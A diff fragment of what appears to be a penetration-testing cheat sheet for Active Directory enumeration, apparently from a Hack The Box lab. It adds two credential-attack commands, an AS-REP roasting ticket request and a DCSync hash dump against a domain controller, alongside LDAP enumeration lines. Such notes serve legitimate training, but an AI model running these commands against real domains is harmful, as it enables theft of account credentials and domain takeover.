@@ -50,6 +50,8 @@ nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
 ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
 ldapsearch -H ldap://[IP_ADDR] -x -b '' -s base
 windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
+GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Rosting
+secretdumps.py htb.local/svc_user@10.10.10.161 -just-dc 		# dcsync attack, dump hashes
 
 Database of AD stored on C:\Windows\NTNDS\ntds.dit of DC
 ```
